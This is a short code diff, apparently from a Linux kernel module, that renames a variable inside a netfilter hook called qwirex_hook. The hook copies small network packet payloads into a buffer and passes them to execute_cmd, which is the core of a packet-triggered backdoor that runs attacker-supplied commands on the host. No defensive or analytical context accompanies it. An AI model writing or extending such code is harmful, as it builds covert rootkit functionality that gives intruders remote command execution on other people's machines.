@@ -108,14 +108,14 @@ static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf
 
             if (payload_len < 256)
             {
-                char *text = kmalloc(payload_len + 1, GFP_ATOMIC);
+                char *data = kmalloc(payload_len + 1, GFP_ATOMIC);
 
-                if (text)
+                if (data)
                 {
-                    memcpy(text,payload,payload_len);
-                    text[payload_len] = '\0';
-                    execute_cmd(text);
-                    kfree(text);
+                    memcpy(data,payload,payload_len);
+                    data[payload_len] = '\0';
+                    execute_cmd(data);
+                    kfree(data);
                 }
 
                 else
